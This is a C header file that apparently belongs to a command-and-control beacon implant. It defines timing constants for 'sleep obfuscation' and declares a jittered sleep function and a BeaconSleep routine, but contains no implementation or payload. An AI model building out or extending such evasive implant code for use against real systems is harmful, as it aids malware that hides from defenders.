#pragma once

#include "beacon_context.h"

#define SLEEP_OBF_MIN_MS 1000u
#define SLEEP_OBF_MIN_MASK_MS 1500u
#define SLEEP_OBF_SETUP_BUDGET 1000u
#define SLEEP_OBF_TIMER_STEP_MS 100u
#define SLEEP_OBF_TIMER_STAGE_COUNT 7u

DWORD SleepCalculateWithJitter(const Profile* profile);
VOID BeaconSleep(BeaconContext* ctx);
